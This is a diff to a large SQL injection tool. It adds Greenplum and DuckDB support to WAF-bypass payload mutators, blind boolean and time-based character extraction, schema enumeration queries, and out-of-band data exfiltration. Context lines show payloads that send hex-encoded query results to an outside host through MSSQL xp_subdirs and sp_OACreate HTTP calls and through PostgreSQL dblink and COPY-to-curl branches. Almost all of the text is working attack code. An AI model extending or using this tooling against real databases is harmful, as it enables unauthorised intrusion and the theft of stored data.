@@ -19962,7 +19962,13 @@ class BypassPool:
             # Remove lowest quality bypass
             self.bypasses.sort(key=lambda b: b.quality_score)
             self.bypasses.pop(0)
-        
+            # BUG-BYPASSPOOL-INDEX-OOB FIX: after shrinking the list, current_index
+            # may equal len(self.bypasses), causing IndexError in get_current().
+            if self.bypasses:
+                self.current_index = min(self.current_index, len(self.bypasses) - 1)
+            else:
+                self.current_index = 0
+
         bypass = BypassPayload(
             payload=payload,
             seed=seed,
@@ -24600,7 +24606,7 @@ class RandomPayloadGenerator:
                  " AND ASCII(SUBSTR(DATABASE(),1,1))<0-- -",                     "and_ascii_db"),
                 (f" AND POW({val1},1)={val1}-- -", f" AND POW({val1},1)={val2}-- -", "and_pow"),
             ]
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             _candidates = [
                 (f" AND {val1}={val1}-- -",       f" AND {val1}={val2}-- -",       "and_eq_num"),
                 (f" OR {val1}={val1}-- -",        f" OR {val1}={val2}-- -",        "or_eq_num"),
@@ -24989,7 +24995,7 @@ class RandomPayloadGenerator:
         techniques = []
         
         # Redundant casts (10 variants)
-        if self.dbms in ("MSSQL", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-EXOTIC-CAST-CRDB-YG-REDSHIFT FIX: PG-compat engines support CAST(x AS INT/INTEGER)
+        if self.dbms in ("MSSQL", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):  # BUG-EXOTIC-CAST-CRDB-YG-REDSHIFT FIX: PG-compat engines support CAST(x AS INT/INTEGER)
             techniques.extend([
                 lambda p: re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', r'CAST(\1 AS INT)', p, count=1) if random.random() > 0.7 else p,
                 lambda p: re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', r'CAST(\1 AS INTEGER)', p, count=1) if random.random() > 0.8 else p,
@@ -25035,7 +25041,7 @@ class RandomPayloadGenerator:
         techniques.extend([
             # BUG-STRINGSPLIT-NEWDBMS FIX: TiDB/CockroachDB/YugabyteDB/Redshift support
             # comment-concatenated keyword splitting same as MySQL/MariaDB/PostgreSQL.
-            lambda p: p.replace("SELECT", "SEL"+"ECT") if "SELECT" in p.upper() and random.random() > 0.8 and self.dbms in ("MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else p,
+            lambda p: p.replace("SELECT", "SEL"+"ECT") if "SELECT" in p.upper() and random.random() > 0.8 and self.dbms in ("MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB") else p,
             lambda p: re.sub(r"'(\w+)'", lambda m: f"CHAR({','.join(str(ord(c)) for c in m.group(1))})", p, count=1) if random.random() > 0.85 and self.dbms in ("MySQL", "MariaDB", "TiDB") else p,
         ])
         
@@ -25185,7 +25191,7 @@ class RandomPayloadGenerator:
                 lambda p: p.replace("=", " LIKE ") if "LIKE" not in p else p,
                 lambda p: re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', r'\1e0', p),  # Scientific notation
             ]
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             exotics = [
                 lambda p: p.replace("'", "$$") if p.count("'") == 2 else p,
                 lambda p: p.replace("||", "||''||"),
@@ -25288,6 +25294,7 @@ class DBMSTamperCompatibility:
             "MSSQL", "Sybase",                     # MSSQL-wire group
             "PostgreSQL", "CockroachDB",            # PostgreSQL-wire group
             "YugabyteDB", "Amazon Redshift",        # PostgreSQL-wire group
+            "Greenplum", "DuckDB",                  # PostgreSQL-wire group
             "Oracle", "SQLite",                     # native engines
             "Generic",
         }
@@ -25314,6 +25321,7 @@ class DBMSTamperCompatibility:
         for tamper in cls.POSTGRESQL_TAMPERS:
             cls.TAMPER_DBMS_MAP[tamper] = {
                 "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                "Greenplum", "DuckDB",
             }
 
         for tamper in cls.ORACLE_TAMPERS:
@@ -25473,6 +25481,18 @@ class SQLSyntaxValidator:
             (r'\bIF\s*\(', "Amazon Redshift doesn't have MySQL IF() (use CASE WHEN)"),
             (r'\bSLEEP\s*\(', "Amazon Redshift uses pg_sleep() not SLEEP()"),
             (r'IFNULL\(', "Amazon Redshift uses COALESCE() or NVL() not IFNULL()"),
+        ],
+        "Greenplum": [
+            (r'\bCHAR\(\d+\)', "Greenplum uses CHR() not CHAR() (PG-compatible)"),
+            (r'0x[0-9a-fA-F]+', "Greenplum doesn't support 0x hex literals"),
+            (r'\bIF\s*\(', "Greenplum doesn't have MySQL IF() (use CASE WHEN)"),
+            (r'\bSLEEP\s*\(', "Greenplum uses pg_sleep() not SLEEP()"),
+            (r'IFNULL\(', "Greenplum uses COALESCE() not IFNULL()"),
+        ],
+        "DuckDB": [
+            (r'\bIF\s*\(', "DuckDB doesn't have MySQL IF() (use CASE WHEN or IIF())"),
+            (r'\bSLEEP\s*\(', "DuckDB uses pg_sleep() not SLEEP()"),
+            (r'IFNULL\(', "DuckDB uses COALESCE() or IFNULL() — check compatibility"),
         ],
     }
     
@@ -26621,7 +26641,12 @@ class AdvancedDNSExfil:
                  "DECLARE @_sqrh VARCHAR(999);SET @_sqrh=CHAR(92)+CHAR(92)+" + hx + "+CHAR(46)+'" + h + "'+CHAR(92)+CHAR(97);EXEC master..xp_subdirs @_sqrh"),
             ]
 
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                      "Greenplum"):
+            # BUG-OOB-GREENPLUM-PG-FAMILY FIX (MEDIUM): Greenplum was absent from the
+            # PostgreSQL OOB exfil branch → fell to empty payloads [] → OOB channel
+            # completely non-functional for Greenplum targets (which support dblink and
+            # COPY TO PROGRAM identically to PostgreSQL, being a PG fork).
             hx = "encode((" + query + ")::bytea,$$hex$$)"
             payloads = [
                 ("dblink",
@@ -26695,7 +26720,9 @@ class HTTPExfil:
                  "DECLARE @_sqro INT,@_sqru VARCHAR(999);SET @_sqru='http://" + h + "/'+" + hx + ";EXEC sp_OACreate 'MSXML2.XMLHTTP',@_sqro OUT;EXEC sp_OAMethod @_sqro,'open',NULL,'GET',@_sqru;EXEC sp_OAMethod @_sqro,'send'"),
             ]
 
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                      "Greenplum"):
+            # BUG-HTTPEXFIL-GREENPLUM-PG-FAMILY FIX (MEDIUM): Greenplum absent from PG branch.
             hx = "encode((" + query + ")::bytea,$$hex$$)"
             payloads = [
                 ("copy_curl",
@@ -27232,6 +27259,8 @@ class BitShiftExtractor:
             "CockroachDB": f"ASCII(SUBSTRING(({query}) FROM {char_pos} FOR 1))",
             "YugabyteDB": f"ASCII(SUBSTRING(({query}) FROM {char_pos} FOR 1))",
             "Amazon Redshift": f"ASCII(SUBSTRING(({query}) FROM {char_pos} FOR 1))",
+            "Greenplum": f"ASCII(SUBSTRING(({query}) FROM {char_pos} FOR 1))",
+            "DuckDB": f"ASCII(SUBSTRING(({query}) FROM {char_pos} FOR 1))",
             "MSSQL": f"UNICODE(SUBSTRING(({query}),{char_pos},1))",
             # BUG-R7-CHARFN-ORACLE FIX (Req 7/10): ASCII() returns NULL for codepoints >127.
             # CASE/ASCIISTR scalar-subquery covers full BMP range (U+0000..U+FFFF).
@@ -28278,6 +28307,10 @@ class LengthFallback:
         # BUG-LENFALLBACK-REDSHIFT FIX: Amazon Redshift is PG-compatible; use PG alternatives.
         "Amazon Redshift": ["LEN({val})", "LENGTH({val})", "CHAR_LENGTH({val})",
                             "OCTET_LENGTH({val})"],
+        "Greenplum": ["LENGTH({val})", "CHAR_LENGTH({val})", "OCTET_LENGTH({val})",
+                      "LENGTH(CAST({val} AS TEXT))"],
+        "DuckDB": ["LENGTH({val})", "CHAR_LENGTH({val})", "LEN({val})",
+                   "LENGTH(CAST({val} AS TEXT))"],
         "MSSQL": ["LEN({val})", "DATALENGTH({val})", "LEN(CAST({val} AS VARCHAR(MAX)))"],
         "Oracle": ["LENGTH({val})", "LENGTHB({val})", "LENGTH(TO_CHAR({val}))"],
         "SQLite": ["LENGTH({val})", "LENGTH(CAST({val} AS TEXT))"],
@@ -33759,7 +33792,7 @@ class SQLMutationEngine:
                 # BUG-WAFBYPASS-STRMANIP-CRDB FIX: CockroachDB/YugabyteDB/Redshift use ||.
                 if self.dbms in ("MySQL", "MariaDB", "TiDB"):
                     return f"CONCAT('{s[:mid]}','{s[mid:]}')"
-                elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     return f"'{s[:mid]}'||'{s[mid:]}'"
                 elif self.dbms == "MSSQL":
                     # BUG-MSSQL-STRING-MANIP FIX: f"'{s[:mid]}'+''{s[mid:]}'" produces
@@ -35112,6 +35145,8 @@ class PayloadMutationEngine:
         "CockroachDB": ["pg_sleep"],
         "YugabyteDB": ["pg_sleep"],
         "Amazon Redshift": ["pg_sleep"],
+        "Greenplum": ["pg_sleep"],
+        "DuckDB": ["pg_sleep"],
         "MSSQL": ["WAITFOR", "DELAY"],
         "Oracle": ["DBMS_PIPE.RECEIVE_MESSAGE", "DBMS_LOCK.SLEEP"],
         "SQLite": ["RANDOMBLOB", "LIKE"],
@@ -35739,7 +35774,7 @@ class PayloadMutationEngine:
         """
         try:
             val = int(num_str)
-            _pg_compat = ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")  # BUG-MUTNUM-CRDB-YG-REDSHIFT FIX: PG-wire-compat engines use same numeric literal rules
+            _pg_compat = ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB")  # BUG-MUTNUM-CRDB-YG-REDSHIFT FIX: PG-wire-compat engines use same numeric literal rules
             if val == 0:
                 if dbms in ("Oracle",) + _pg_compat:
                     return rng.choice(["0", "(0)"])
@@ -35782,7 +35817,7 @@ class PayloadMutationEngine:
             if dbms in ("MySQL", "MariaDB", "TiDB", "Generic"):
                 # BUG-RANDTRUE-LIKE-TIDB FIX: TiDB supports integer LIKE comparison like MySQL.
                 _variants.append(f"AND {_n} LIKE {_n}")
-            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 # BUG-RANDTRUE-CRDB FIX: wire-compat PG DBMSes support ::int cast syntax.
                 _variants.append(f"AND {_n}::int={_n}::int")
             return rng.choice(_variants)
@@ -35881,6 +35916,10 @@ class PayloadMutationEngine:
                             "UPPER":     ["UPPER"],     "LOWER": ["LOWER"]},
         "Amazon Redshift": {"SUBSTRING": ["SUBSTR"],   "LENGTH": ["CHAR_LENGTH","LEN"],
                             "UPPER":     ["UPPER"],     "LOWER": ["LOWER"]},
+        "Greenplum": {"SUBSTRING": ["SUBSTR"],   "LENGTH": ["CHAR_LENGTH","LEN"],
+                      "UPPER":     ["UPPER"],     "LOWER": ["LOWER"]},
+        "DuckDB": {"SUBSTRING": ["SUBSTR"],   "LENGTH": ["CHAR_LENGTH","LEN"],
+                   "UPPER":     ["UPPER"],     "LOWER": ["LOWER"]},
         # Oracle
         # BUG-ORACLE-LENGTHB FIX: LENGTHB returns the BYTE count of the string
         # in the database character set (e.g. AL32UTF8), which differs from the
@@ -36032,6 +36071,7 @@ class PayloadMutationEngine:
             "TiDB": "SIGNED",   # BUG-CAST-TYPE-TIDB FIX: TiDB uses SIGNED like MySQL
             "PostgreSQL": "INTEGER", "CockroachDB": "INTEGER",
             "YugabyteDB": "INTEGER", "Amazon Redshift": "INTEGER",
+            "Greenplum": "INTEGER", "DuckDB": "INTEGER",
             "MSSQL": "INT", "Oracle": "NUMBER", "SQLite": "INTEGER",
         }.get(dbms, "SIGNED")
         # Only wrap the first standalone non-functional integer
@@ -42316,6 +42356,14 @@ _SLEEP_FREE_TIMING = {
         "(SELECT COUNT(*) FROM generate_series(1,{big}) a, generate_series(1,10) b)",
         "(SELECT COUNT(*) FROM pg_class A,pg_class B)",
     ],
+    "Greenplum": [
+        "(SELECT COUNT(*) FROM generate_series(1,{big}) a, generate_series(1,10) b)",
+        "(SELECT COUNT(*) FROM pg_class A,pg_class B,pg_class C)",
+    ],
+    "DuckDB": [
+        "(SELECT COUNT(*) FROM generate_series(1,{big}) a, generate_series(1,10) b)",
+        "(SELECT COUNT(*) FROM information_schema.tables A,information_schema.tables B)",
+    ],
     "MSSQL": [
         "(SELECT COUNT(*) FROM sysobjects A,sysobjects B,sysobjects C)",
         "(SELECT TOP 1 COUNT(*) FROM information_schema.columns A,information_schema.columns B)",
@@ -44514,6 +44562,8 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                     "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "MySQL":           "ISNULL(NULL)",
                     "MariaDB":         "ISNULL(NULL)",
                     "TiDB":            "ISNULL(NULL)",
@@ -44533,6 +44583,8 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                     "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                     "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                     "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                     "MySQL":           "ISNULL(1e0)",
                     "MariaDB":         "ISNULL(1e0)",
                     "TiDB":            "ISNULL(1e0)",
@@ -44564,7 +44616,7 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                     _ei_calib_dbms = _ifunc_dbms_ei
                     _ei_numeric = (getattr(result, 'technique', '') in
                                    ("B", "BH", "IN", "T", "TH", "HQ", "BT"))
-                    if _ei_calib_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-EI-CALIB-PG-COMPAT FIX
+                    if _ei_calib_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):  # BUG-EI-CALIB-PG-COMPAT FIX
                         _ei_comment = "-- -"
                         _ei_true_pay  = (f" AND ({_ei_true_cond})=1{_ei_comment}" if _ei_numeric
                                          else f"' AND ({_ei_true_cond})=1{_ei_comment}")
@@ -44775,7 +44827,7 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                                  else 'MySQL')
                     _fb_num3 = (result.technique in ("B", "BH", "IN", "T", "TH", "HQ", "BT")
                                 if result and hasattr(result, 'technique') else True)
-                    if _fb_dbms3 in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-FBDBMS3-PG-COMPAT FIX
+                    if _fb_dbms3 in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):  # BUG-FBDBMS3-PG-COMPAT FIX
                         payload = (f" AND ({expr})=1-- -" if _fb_num3 else f"' AND ({expr})=1-- -")
                     elif _fb_dbms3 == "Oracle":
                         # BUG-ORACLE-DUAL-INJECTION FIX (Req 7/8/10): The old payload
@@ -46768,7 +46820,7 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                     # without a leading quote in most SQL engines when the parameter is unquoted.
                     _fb_dbms = _detected_dbms
                     _fb_numeric = (result.technique in ("B", "BH", "IN", "T", "TH", "HQ", "BT"))
-                    if _fb_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-FBDBMS-PG-COMPAT FIX
+                    if _fb_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):  # BUG-FBDBMS-PG-COMPAT FIX
                         payload = (f" AND ({expr})=1-- -" if _fb_numeric
                                    else f"' AND ({expr})=1-- -")
                     elif _fb_dbms == "Oracle":
@@ -47083,7 +47135,7 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                     # BUG-R10-FALLBACK FIX (Req 10): DBMS-aware fallback (same fix as pivot section)
                     _fb_dbms2 = _detected_dbms
                     _fb_numeric2 = (result.technique in ("B", "BH", "IN", "T", "TH", "HQ", "BT"))
-                    if _fb_dbms2 in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-FBDBMS2-PG-COMPAT FIX
+                    if _fb_dbms2 in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):  # BUG-FBDBMS2-PG-COMPAT FIX
                         payload = (f" AND ({expr})=1-- -" if _fb_numeric2
                                    else f"' AND ({expr})=1-- -")
                     elif _fb_dbms2 == "Oracle":
@@ -47477,7 +47529,7 @@ async def blind_extract_string(engine,config,queries,sql_query,result,method,url
         _use_null_sentinel = (
             _detected_dbms_bls in ("Oracle", "PostgreSQL", "MSSQL", "MySQL", "MariaDB", "SQLite",
                                    "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift",
-                                   "Sybase") and  # BUG-V177-BLS-SYBASE-NULL-SENTINEL FIX
+                                   "Sybase", "Greenplum", "DuckDB") and  # BUG-V177-BLS-SYBASE-NULL-SENTINEL FIX
             result and getattr(result, 'technique', '') in _nullable_techs and
             sql_query and
             not _already_null_safe and
@@ -47744,7 +47796,7 @@ async def blind_extract_string(engine,config,queries,sql_query,result,method,url
                     "UNICODE(" in _char_func_template          # BUG-7A-MSSQL-UNICODE FIX: was startswith
                     or _detected_dbms_bls in ("Oracle", "PostgreSQL",
                                                "CockroachDB", "YugabyteDB",
-                                               "Amazon Redshift")  # BUG-BLS-CHARHI FIX: added CDB/YGB/Redshift
+                                               "Amazon Redshift", "Greenplum", "DuckDB")  # BUG-BLS-CHARHI FIX: added CDB/YGB/Redshift
                     or ("ORD(" in _char_func_template
                         and _detected_dbms_bls in ("MySQL", "MariaDB", "TiDB"))
                     # BUG-BLS-TIDB-USE-UNICODE-FN FIX: Added TiDB to the ORD() branch.
@@ -48338,6 +48390,38 @@ SCHEMA_ENUM_FALLBACKS: Dict[str, Dict[str, List[str]]] = {
             " WHERE table_schema='{db}' AND table_name='{table}'",
         ],
     },
+    "Greenplum": {
+        "dbs": [
+            "SELECT STRING_AGG(DISTINCT nspname, ',') FROM pg_catalog.pg_namespace"
+            " WHERE nspname NOT IN ('pg_catalog','information_schema','pg_toast','gp_toolkit')",
+            "SELECT nspname FROM pg_catalog.pg_namespace"
+            " WHERE nspname NOT IN ('pg_catalog','information_schema','pg_toast','gp_toolkit') LIMIT 1",
+        ],
+        "tables": [
+            "SELECT STRING_AGG(schemaname||'.'||tablename, ',')"
+            " FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema','gp_toolkit')",
+        ],
+        "columns": [
+            "SELECT STRING_AGG(column_name, ',') FROM information_schema.columns"
+            " WHERE table_schema='{db}' AND table_name='{table}'",
+        ],
+    },
+    "DuckDB": {
+        "dbs": [
+            "SELECT STRING_AGG(DISTINCT schema_name, ',') FROM information_schema.schemata"
+            " WHERE catalog_name=current_database()",
+            "SELECT schema_name FROM information_schema.schemata"
+            " WHERE catalog_name=current_database() LIMIT 1",
+        ],
+        "tables": [
+            "SELECT STRING_AGG(table_name, ',') FROM information_schema.tables"
+            " WHERE table_schema=current_schema() AND table_type='BASE TABLE'",
+        ],
+        "columns": [
+            "SELECT STRING_AGG(column_name, ',') FROM information_schema.columns"
+            " WHERE table_schema=current_schema() AND table_name='{table}'",
+        ],
+    },
 }
 
 # v17: Query edge-case normalization helpers
@@ -48518,6 +48602,8 @@ def _null_sentinel_wrap(sql: str, dbms: str) -> str:
         "CockroachDB":      f"COALESCE(CAST(({sql}) AS TEXT),'{sentinel}')",
         "YugabyteDB":       f"COALESCE(CAST(({sql}) AS TEXT),'{sentinel}')",
         "Amazon Redshift":  f"COALESCE(CAST(({sql}) AS VARCHAR(65535)),'{sentinel}')",
+        "Greenplum":        f"COALESCE(CAST(({sql}) AS TEXT),'{sentinel}')",
+        "DuckDB":           f"COALESCE(CAST(({sql}) AS TEXT),'{sentinel}')",
         "Oracle":     f"NVL(TO_CHAR(({sql})),'{sentinel}')",
         "SQLite":     f"COALESCE(CAST(({sql}) AS TEXT),'{sentinel}')",
         "DB2":        f"COALESCE(CAST(({sql}) AS VARCHAR(4000)),'{sentinel}')",
@@ -48619,7 +48705,8 @@ def _build_dbms_len_func(sql_query: str, queries: Dict, dbms: str) -> str:
             else:
                 _sq = f"{_sq} WHERE ROWNUM=1"
         return f"NVL(LENGTHC(({_sq})),0)"
-    elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+    elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                  "Greenplum", "DuckDB"):
         # BUG-V168-BUILD-LENF-PG-COMPAT-MISSING FIX (HIGH): The previous check used
         # `elif dbms == "PostgreSQL":` (exact match only). CockroachDB, YugabyteDB, and
         # Amazon Redshift (all three PostgreSQL-wire-compatible DBMSes that support
@@ -48633,6 +48720,13 @@ def _build_dbms_len_func(sql_query: str, queries: Dict, dbms: str) -> str:
         # characters in all extracted strings containing non-ASCII data on these targets.
         # All other engines (blind_extract_string, blind_extract_string_v5, etc.) already
         # explicitly include CockroachDB/YugabyteDB/Amazon Redshift in their PG branches.
+        # BUG-BUILD-LENF-GREENPLUM-DUCKDB FIX (HIGH; Greenplum/DuckDB;
+        # _build_dbms_len_func; all extraction engines using this helper; all surfaces):
+        # Greenplum and DuckDB were absent from this branch and fell to the generic else
+        # branch using queries.get("len_func", "COALESCE(LENGTH(...),0)"). LENGTH() returns
+        # byte count for multi-byte UTF-8 strings on both PostgreSQL-compatible engines.
+        # CHAR_LENGTH() returns character count. Byte over-counting causes extraction engines
+        # to probe phantom positions past string end → garbled trailing chars on non-ASCII data.
         # Numeric safety: COALESCE/CHAR_LENGTH return integers; no string delimiters modified.
         return f"COALESCE(CHAR_LENGTH(({_sq})),0)"
     elif dbms == "SQLite":
@@ -48713,6 +48807,10 @@ def _build_dbms_char_func_default(dbms: str) -> str:
         # BUG-CHARFN-REDSHIFT FIX: Amazon Redshift is PG-compatible; explicit entry
         # avoids falling to generic default. Redshift SUBSTRING and ASCII work correctly.
         "Amazon Redshift": "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+        # BUG-CHARFN-GREENPLUM FIX (HIGH): Greenplum was absent → fell to generic fallback
+        # "COALESCE(ASCII(SUBSTRING(...)),0)" which is correct SQL but may not have COALESCE
+        # in all code paths; explicit entry is consistent with other PG-family DBMSes.
+        "Greenplum":   "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
         "DuckDB":      "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
         "MSSQL":       "ISNULL(UNICODE(SUBSTRING(({query}),{pos},1)),0)",
         "Sybase":      "ISNULL(UNICODE(SUBSTRING(({query}),{pos},1)),0)",
@@ -48794,7 +48892,7 @@ def _build_dbms_char_hi(dbms: str, char_func_tmpl: str = "") -> int:
     # check, so _build_dbms_char_hi("Amazon Redshift", "ASCII(...)") returned 255 — wrong.
     if "ASCII(" in _cf_upper and dbms in ("PostgreSQL", "CockroachDB",
                                            "YugabyteDB", "DuckDB",
-                                           "Amazon Redshift"):
+                                           "Amazon Redshift", "Greenplum"):
         return 1114111
     # DBMS-specific ceilings when template detection is inconclusive
     if dbms in ("MSSQL", "Sybase"):
@@ -48807,7 +48905,7 @@ def _build_dbms_char_hi(dbms: str, char_func_tmpl: str = "") -> int:
     # PostgreSQL-compatible DBMSes that return 0..U+10FFFF from ASCII().
     if dbms in ("MySQL", "MariaDB", "TiDB",
                 "PostgreSQL", "CockroachDB", "YugabyteDB", "DuckDB",
-                "Amazon Redshift"):
+                "Amazon Redshift", "Greenplum"):
         return 1114111   # all return full Unicode code points
     # Conservative default for unknown/generic DBMS
     return 255
@@ -49614,6 +49712,8 @@ class Enumerator:
                         "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "MySQL":           "ISNULL(NULL)",
                         "MariaDB":         "ISNULL(NULL)",
                         "TiDB":            "ISNULL(NULL)",
@@ -49633,6 +49733,8 @@ class Enumerator:
                         "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                         "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                         "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                         "MySQL":           "ISNULL(1e0)",
                         "MariaDB":         "ISNULL(1e0)",
                         "TiDB":            "ISNULL(1e0)",
@@ -50180,6 +50282,8 @@ class Enumerator:
                     "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "MySQL":           "ISNULL(NULL)",
                     "MariaDB":         "ISNULL(NULL)",
                     "TiDB":            "ISNULL(NULL)",
@@ -50199,6 +50303,8 @@ class Enumerator:
                     "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                     "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                     "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                     "MySQL":           "ISNULL(1e0)",
                     "MariaDB":         "ISNULL(1e0)",
                     "TiDB":            "ISNULL(1e0)",
@@ -50566,7 +50672,7 @@ class Enumerator:
         if _nofunc_len_skip:
             # Sentinel — binary search below checks for None and skips.
             _len_q = None
-        elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             # BUG-EXTRACT-LENQ-PG-CRDB FIX: CockroachDB/YugabyteDB/Redshift are PG-wire-
             # compatible; COALESCE(CHAR_LENGTH()) is supported and guards NULL subqueries.
             _len_q = f"COALESCE(CHAR_LENGTH(({sql})),0)"
@@ -50850,6 +50956,8 @@ class Enumerator:
                         "CockroachDB":     ("ASCII", "SUBSTRING"),
                         "YugabyteDB":      ("ASCII", "SUBSTRING"),
                         "Amazon Redshift": ("ASCII", "SUBSTRING"),
+                        "Greenplum": ("ASCII", "SUBSTRING"),
+                        "DuckDB": ("ASCII", "SUBSTRING"),
                     }
                     _pce_af, _pce_sf = _pcv_char_funcs.get(
                         self.dbms, ("ASCII", "SUBSTRING"))
@@ -51260,7 +51368,7 @@ class Enumerator:
                 elif self.dbms == "Oracle":
                     val_literal = "'" + test_prefix.replace("'", "''") + "'"
                 # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Redshift.
-                elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     if "$$" not in test_prefix:
                         val_literal = f"$${test_prefix}$$"
                     else:
@@ -51269,7 +51377,7 @@ class Enumerator:
                     val_literal = "'" + test_prefix.replace("'", "''") + "'"
                 # Build stacked query with FROM table WHERE col >= val
                 # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Redshift.
-                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
